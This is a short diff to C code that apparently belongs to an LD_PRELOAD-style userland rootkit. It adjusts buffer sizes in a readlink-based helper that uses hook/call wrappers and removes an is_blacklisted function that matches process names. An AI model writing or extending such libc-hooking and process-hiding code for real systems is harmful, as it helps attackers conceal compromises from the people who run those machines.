@@ -6,26 +6,11 @@ char *gdirname(DIR *dirp){
     char path[PATH_MAX], *filename = (char *)malloc(PATH_MAX);
     memset(filename, 0, PATH_MAX);
 
-    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
+    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);
 
     hook(CREADLINK);
-    if((long)call(CREADLINK, path, filename, sizeof(path)) < 0) return NULL;
+    if((long)call(CREADLINK, path, filename, sizeof(path)-1) < 0) return NULL;
     return filename;
-}
-
-int is_blacklisted(const char *process){
-    char *proc;
-    int r = 0;
-
-    for(int i = 0; i < PROCESS_BLACKLIST_SIZE; i++){
-        proc = process_blacklist[i];
-        if(!strncmp(proc, process, strlen(proc))){
-            r = 1;
-            break;
-        }
-    }
-
-    return r;
 }
 
 int mkdir(const char *pathname, mode_t mode);
